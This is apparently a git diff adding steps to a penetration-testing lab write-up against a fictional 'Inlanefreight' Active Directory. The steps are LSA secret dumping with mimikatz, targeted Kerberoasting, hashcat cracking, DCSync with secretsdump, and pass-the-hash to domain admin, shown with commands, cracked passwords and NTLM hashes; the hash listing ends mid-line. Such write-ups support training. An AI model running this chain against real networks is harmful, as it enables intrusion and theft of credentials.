@@ -637,7 +637,7 @@ dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
 ```
 Where we can see hporter:Gr8hambino!
 
-Since we have a local administrator account on DEV01, we now can use Sharphound to map out the data from the AD domain for the Bloodhound tool so that we can visualize AD rights and memberships to check for more opportunities in privilege escalation, as well as possibly find how the hporter user credentials can be used in this AD domain. We can use Evil-WinRM to upload Sharphound.exe and create a zip file for BloodHound to enumerate the domain:
+Since we now have a local administrator account on DEV01, we can use Sharphound to map out the data from the AD domain for the Bloodhound tool so that we can visualize AD rights and memberships to check for more opportunities in privilege escalation, as well as possibly find how the hporter user credentials can be used in this AD domain. We can use Evil-WinRM to upload Sharphound.exe and create a zip file for BloodHound to enumerate the domain:
 ```
 upload /path/to/local/file C:/Users/victim/Desktop/file.exe
 ./SharpHound.exe -c All
@@ -902,6 +902,93 @@ Logged in as low privileged account
 	whoami
 	nt authority\system
 ```
+Next we can add ilfserveradm as a local administrator with the following command:
+```
+net localgroup administrators /add ilfserveradm
+```
+We can also now transfer interesting files on the machine to our attack box by using xfreerdp's TSCLIENT. We see files named budget_data.xlsx and Inlanefreight.kdbx which may be interesting so we transfer those. 
+
+We can then import mimikatz.exe from our attack box to dump LSA secrets. 
+```
+.\mimikatz.exe lsadump::secrets
+
+Secret  : DefaultPassword
+cur/text: DBAilfreight1!
+```
+We see a secret named DefaultPassword, which is most likely a naming convention for the Windows Autologon feature. We run the following command to find the Windows Autologon DefaultUsername:
+```
+Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
+
+DefaultUserName : mssqladm
+PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+                  NT\CurrentVersion\Winlogon\
+PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+PSChildName     : Winlogon
+PSDrive         : HKLM
+PSProvider      : Microsoft.PowerShell.Core\Registry
+```
+which gives us the username mssqladm.
+
+We now have a new credential pair: mssqladm:DBAilfreight1!
+
+We can also use LaZagne.exe and Responder or Inveigh to further attempt to retrieve passwords from 172.16.8.50 but we see that they come up short. 
+
+Since we now have a new credential pair, we can look up the username in Bloodhound. We see that mssqladm has GenericWrite permissions over the user ttimmons. We now go back to the DEV01 host with the hporter domain user and we launch the following commands to create a PSCredential Object and create an SPN for the ttimmons user:
+```
+PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
+PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
+Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
+
+VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
+VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
+VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
+VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
+VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
+(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
+VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons'
+```
+Now we can use GetUserSPNs.py to get the SPN hash from ttimmons:
+```
+proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+```
+We save the hash and run hashcat:
+```
+hashcat -m 13100 hash.txt rockyou.txt
+
+Repeat09
+```
+So we get the credential pair ttimmons:Repeat09
+
+We check on Bloodhound for ttimmons' permissions and we see that they have the GenericAll right to the SERVER ADMINS group, meaning that ttimmons can add anyone to the SERVER ADMINS group. We also see that the SERVER ADMINS group has the GetChanges and GetChangesAll right to the domain, meaning that we can launch a DCSync attack to get credentials from the domain. 
+
+We first add a PSCredential Object for ttimmons:
+```
+$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force
+$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+```
+We then can add the user to the Server Admins group to inherit the DCSync privileges:
+```
+$group = Convert-NameToSid "Server Admins"
+Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
+```
+Finally we can use secretsdump.py to DCSync all NTLM password hashes from the Domain Controller:
+```
+proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::
+inlanefreight.local\avazquez:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
+inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
+inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
+inlanefreight.local\wdill
+```
+Now that we have the hash for the domain controller's local administrator account, we can use Evil-WinRM to use pass-the-hash to login. Once we login, we see that we are finally domain and enterprise admin.
+
+
+
+
+
 
 
 
